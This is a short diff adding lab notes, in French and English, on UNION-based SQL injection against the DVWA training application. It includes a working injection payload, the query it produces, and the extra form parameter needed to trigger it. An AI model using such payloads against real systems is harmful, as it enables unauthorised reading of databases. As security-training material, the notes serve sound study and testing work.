@@ -1,0 +1,9 @@
+UNION-Based SQL Injection (avec marqueur de vérification) :
+Input:
+?id=1' UNION SELECT 'MIRAGE_PROBE_7F3A', version()#
+The resulting query becomes:
+SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 'MIRAGE_PROBE_7F3A', version()#;
+La chaîne 'MIRAGE_PROBE_7F3A' apparaît alors dans la page (champ First name),
+prouvant que l'injection a été exécutée.
+Le formulaire DVWA transmet aussi le paramètre "Submit=Submit", nécessaire
+pour déclencher l'exécution de la requête côté serveur.
